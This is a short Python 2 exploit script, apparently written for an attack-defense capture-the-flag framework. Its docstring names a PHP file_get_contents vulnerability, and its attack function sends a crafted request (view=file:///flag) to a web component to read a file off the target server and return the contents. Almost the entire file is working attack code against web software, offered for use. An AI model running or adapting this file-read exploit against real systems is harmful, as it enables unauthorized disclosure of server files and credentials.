#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        cmd = flag_path
        data = quote(cmd) 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
        print 'haozigege'
	res = attack(target,target_port,cmd)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
        res = cmd_prefix + res + cmd_postfix
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def attack(ip,port,cmd):
    my_socket = ip + ':' + str(port)
    rep = requests.get("http://%s/index.php/component/users/?view=file:///flag"%my_socket)

    print rep.content
    return rep.content
